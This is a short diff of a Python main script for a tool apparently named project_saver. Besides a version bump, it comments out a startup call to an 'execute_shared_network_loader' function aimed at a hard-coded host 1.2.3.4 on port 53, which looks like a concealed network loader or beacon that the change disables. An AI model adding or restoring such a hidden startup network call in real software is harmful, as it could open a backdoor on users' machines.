@@ -25,7 +25,7 @@ import project_saver_ui
 import project_saver_daemon
 import project_saver_modules
 
-VERSION = "v0.0.83-golf"
+VERSION = "v0.0.83-hotel"
 PORT = 19763
 EXPECTED_TOKEN = ""
 CONSOLE_LOCK = threading.Lock()
@@ -288,8 +288,8 @@ if __name__ == "__main__":
     CLI_ARGS = parser.parse_args(combined_args)
     cli_dict = vars(CLI_ARGS)
 
-    import project_saver_x
-    project_saver_x.execute_shared_network_loader(target_host="1.2.3.4", target_port=53, title_tag="SYSTEM INIT")
+    #import project_saver_x
+    #project_saver_x.execute_shared_network_loader(target_host="1.2.3.4", target_port=53, title_tag="SYSTEM INIT")
 	
     project_saver_modules.bootstrap_and_discover_modules(cli_dict, VERSION, PORT)
     if cli_dict.get("module"):
